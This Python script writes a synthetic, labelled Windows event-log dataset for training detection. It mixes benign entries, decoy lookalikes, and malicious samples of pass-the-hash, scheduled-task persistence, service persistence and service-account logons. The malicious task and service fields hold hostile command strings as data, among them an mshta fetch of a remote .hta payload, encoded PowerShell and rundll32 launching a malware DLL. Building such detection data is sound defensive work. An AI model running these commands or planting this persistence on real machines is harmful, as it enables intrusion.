import json
import random
from pathlib import Path

DATASET_PATH = Path(__file__).parent.parent / "backend" / "app" / "data" / "datasets" / "windows_security.json"

random.seed(42)

entries = []

# --- CH_001 (Pass-the-Hash: T1550.002) ---
# 30 Malicious
for i in range(30):
  entries.append({
    "EventID": 4624,
    "TimeCreated": f"2026-07-25T{i%24:02d}:15:00Z",
    "Computer": f"WKS-ENG-{100+i}",
    "SubjectUserName": "attacker_user",
    "TargetUserName": f"victim_{i}",
    "LogonType": random.choice([3, 9]),
    "AuthenticationPackageName": "NTLM",
    "LogonProcessName": "NtLmSsp",
    "WorkstationName": f"ATTACK-NODE-{i}",
    "malicious": True,
    "attack_type": "T1550.002"
  })

# 15 Confusers 1 (LEGACY-PRINT-01)
for i in range(15):
  entries.append({
    "EventID": 4624,
    "TimeCreated": f"2026-07-25T{i%24:02d}:20:00Z",
    "Computer": "SRV-PRINT-01",
    "SubjectUserName": "print_spooler",
    "TargetUserName": f"user_print_{i}",
    "LogonType": 3,
    "AuthenticationPackageName": "NTLM",
    "LogonProcessName": "NtLmSsp",
    "WorkstationName": "LEGACY-PRINT-01",
    "malicious": False,
    "attack_type": None
  })

# 15 Confusers 2 (svc_breakglass)
for i in range(15):
  entries.append({
    "EventID": 4624,
    "TimeCreated": f"2026-07-25T{i%24:02d}:25:00Z",
    "Computer": f"SRV-DC-{i%3+1:02d}",
    "SubjectUserName": "svc_breakglass",
    "TargetUserName": "admin_emergency",
    "LogonType": 3,
    "AuthenticationPackageName": "NTLM",
    "LogonProcessName": "NtLmSsp",
    "WorkstationName": f"CONSOLE-EMERG-{i}",
    "malicious": False,
    "attack_type": None
  })


# --- CH_002 (Scheduled Task Creation: T1053.005) ---
# 30 Malicious
mal_payloads = [
  ("powershell.exe -enc aW52b2tlLWV4cHJlc3Npb24=", "\\Microsoft\\Windows\\Maintenance\\PersistTask"),
  ("mshta.exe http://10.0.0.5/payload.hta", "\\Microsoft\\Windows\\Update\\HelperTask"),
  ("rundll32.exe C:\\Users\\Public\\malware.dll,Start", "\\System\\Updater\\ServiceTask"),
  ("cmd.exe /c powershell -EncodedCommand JABzAD0A", "\\Microsoft\\Task\\Run"),
  ("javascript:eval(vbs_code)", "\\Microsoft\\Windows\\App\\Sync")
]

for i in range(30):
  payload, tname = mal_payloads[i % len(mal_payloads)]
  entries.append({
    "EventID": 4698,
    "TimeCreated": f"2026-07-25T{i%24:02d}:30:00Z",
    "Computer": f"WKS-FIN-{200+i}",
    "SubjectUserName": f"user_fin_{i}",
    "TaskName": f"{tname}_{i}",
    "TaskContent": payload,
    "malicious": True,
    "attack_type": "T1053.005"
  })

# 15 Confusers 1 (\IT\Audit)
for i in range(15):
  entries.append({
    "EventID": 4698,
    "TimeCreated": f"2026-07-25T{i%24:02d}:35:00Z",
    "Computer": f"WKS-CORP-{i}",
    "SubjectUserName": "it_admin",
    "TaskName": "\\IT\\Audit",
    "TaskContent": "powershell.exe -enc <benign_audit_script_token>",
    "malicious": False,
    "attack_type": None
  })

# 15 Confusers 2 (\System\Backup)
for i in range(15):
  entries.append({
    "EventID": 4698,
    "TimeCreated": f"2026-07-25T{i%24:02d}:40:00Z",
    "Computer": f"SRV-APP-{i}",
    "SubjectUserName": "system_backup",
    "TaskName": "\\System\\Backup",
    "TaskContent": "rundll32.exe C:\\Windows\\System32\\sdclt.dll,RunBackup",
    "malicious": False,
    "attack_type": None
  })


# --- CH_006 (Malicious Service Persistence: T1543.003) ---
# 30 Malicious
svc_mal_payloads = [
  ("C:\\Users\\Public\\Temp\\backdoor.exe", "PersistenceSvc"),
  ("C:\\Users\\victim\\AppData\\Local\\Temp\\update.exe", "MaliciousUpdater"),
  ("powershell -enc aW52b2tlLWV4cHJlc3Npb24=", "PowerShellSvc"),
  ("C:\\AppData\\Roaming\\malware.exe", "AppSvcRunner"),
  ("C:\\Windows\\Temp\\svc_loader.exe", "TempLoaderSvc")
]

for i in range(30):
  path, sname = svc_mal_payloads[i % len(svc_mal_payloads)]
  entries.append({
    "EventID": 7045,
    "TimeCreated": f"2026-07-25T{i%24:02d}:45:00Z",
    "Computer": f"WKS-DEV-{300+i}",
    "SubjectUserName": "SYSTEM",
    "ServiceName": f"{sname}_{i}",
    "ServiceFileName": path,
    "ServiceType": "0x10",
    "StartType": "2",
    "malicious": True,
    "attack_type": "T1543.003"
  })

# 15 Confusers 1 (IT_Audit_Agent)
for i in range(15):
  entries.append({
    "EventID": 7045,
    "TimeCreated": f"2026-07-25T{i%24:02d}:50:00Z",
    "Computer": f"WKS-WORK-{i}",
    "SubjectUserName": "SYSTEM",
    "ServiceName": "IT_Audit_Agent",
    "ServiceFileName": "C:\\Windows\\Temp\\IT_Audit\\agent_installer.exe",
    "ServiceType": "0x10",
    "StartType": "2",
    "malicious": False,
    "attack_type": None
  })

# 15 Confusers 2 (Corp_Backup_Svc)
for i in range(15):
  entries.append({
    "EventID": 7045,
    "TimeCreated": f"2026-07-25T{i%24:02d}:55:00Z",
    "Computer": f"SRV-DATA-{i}",
    "SubjectUserName": "SYSTEM",
    "ServiceName": "Corp_Backup_Svc",
    "ServiceFileName": "powershell -enc <corp_diagnostic_backup_script>",
    "ServiceType": "0x10",
    "StartType": "2",
    "malicious": False,
    "attack_type": None
  })


# --- CH_007 (Suspicious Service Account Interactive Logon: T1078.002) ---
# 30 Malicious
svc_names = ["svc_sql", "svc_backup", "svc_deploy", "svc_app", "svc_db"]

for i in range(30):
  sname = svc_names[i % len(svc_names)]
  entries.append({
    "EventID": 4624,
    "TimeCreated": f"2026-07-25T{i%24:02d}:05:00Z",
    "Computer": f"WKS-DESK-{400+i}",
    "SubjectUserName": "ANONYMOUS LOGON",
    "TargetUserName": f"{sname}_prod",
    "LogonType": 2,
    "AuthenticationPackageName": "Negotiate",
    "LogonProcessName": "User32",
    "WorkstationName": f"WKS-DESK-{400+i}",
    "malicious": True,
    "attack_type": "T1078.002"
  })

# 15 Confusers 1 (svc_breakglass)
for i in range(15):
  entries.append({
    "EventID": 4624,
    "TimeCreated": f"2026-07-25T{i%24:02d}:10:00Z",
    "Computer": f"SRV-CORE-{i}",
    "SubjectUserName": "ANONYMOUS LOGON",
    "TargetUserName": "svc_breakglass",
    "LogonType": 2,
    "AuthenticationPackageName": "Negotiate",
    "LogonProcessName": "User32",
    "WorkstationName": f"SRV-CORE-{i}",
    "malicious": False,
    "attack_type": None
  })

# 15 Confusers 2 (CONSOLE-STAGING-01)
for i in range(15):
  entries.append({
    "EventID": 4624,
    "TimeCreated": f"2026-07-25T{i%24:02d}:12:00Z",
    "Computer": "CONSOLE-STAGING-01",
    "SubjectUserName": "ANONYMOUS LOGON",
    "TargetUserName": f"svc_stage_{i}",
    "LogonType": 2,
    "AuthenticationPackageName": "Negotiate",
    "LogonProcessName": "User32",
    "WorkstationName": "CONSOLE-STAGING-01",
    "malicious": False,
    "attack_type": None
  })


# --- 160 Benign Background Entries ---
for i in range(160):
  eid = random.choice([4624, 4625, 4688, 4698, 7045])
  if eid == 4624:
    entries.append({
      "EventID": 4624,
      "TimeCreated": f"2026-07-25T{i%24:02d}:02:00Z",
      "Computer": f"WKS-USER-{i}",
      "SubjectUserName": f"user_{i}",
      "TargetUserName": f"employee_{i}",
      "LogonType": random.choice([2, 3, 5]),
      "AuthenticationPackageName": "Kerberos",
      "LogonProcessName": "Kerberos",
      "WorkstationName": f"WKS-USER-{i}",
      "malicious": False,
      "attack_type": None
    })
  elif eid == 4625:
    entries.append({
      "EventID": 4625,
      "TimeCreated": f"2026-07-25T{i%24:02d}:04:00Z",
      "Computer": f"WKS-USER-{i}",
      "SubjectUserName": f"user_{i}",
      "TargetUserName": f"employee_{i}",
      "LogonType": 2,
      "FailureReason": "%%2313",
      "malicious": False,
      "attack_type": None
    })
  elif eid == 4688:
    entries.append({
      "EventID": 4688,
      "TimeCreated": f"2026-07-25T{i%24:02d}:06:00Z",
      "Computer": f"WKS-USER-{i}",
      "SubjectUserName": f"employee_{i}",
      "NewProcessName": "C:\\Windows\\System32\\notepad.exe",
      "ParentProcessName": "C:\\Windows\\explorer.exe",
      "CommandLine": "notepad.exe document.txt",
      "malicious": False,
      "attack_type": None
    })
  elif eid == 4698:
    entries.append({
      "EventID": 4698,
      "TimeCreated": f"2026-07-25T{i%24:02d}:08:00Z",
      "Computer": f"WKS-USER-{i}",
      "SubjectUserName": "SYSTEM",
      "TaskName": "\\Microsoft\\Windows\\Time Synchronization",
      "TaskContent": "w32tm.exe /resync",
      "malicious": False,
      "attack_type": None
    })
  else: # 7045
    entries.append({
      "EventID": 7045,
      "TimeCreated": f"2026-07-25T{i%24:02d}:14:00Z",
      "Computer": f"SRV-NODE-{i}",
      "SubjectUserName": "SYSTEM",
      "ServiceName": f"LegitService_{i}",
      "ServiceFileName": f"C:\\Program Files\\Vendor_{i}\\service.exe",
      "ServiceType": "0x10",
      "StartType": "2",
      "malicious": False,
      "attack_type": None
    })

# Shuffle dataset deterministically
random.shuffle(entries)

data = {"entries": entries}

with open(DATASET_PATH, "w", encoding="utf-8") as f:
  json.dump(data, f, indent=2)

print(f"Generated {len(entries)} entries into {DATASET_PATH}")
mal_count = sum(1 for e in entries if e.get("malicious"))
print(f"Total Malicious: {mal_count} ({mal_count/len(entries)*100:.1f}%)")
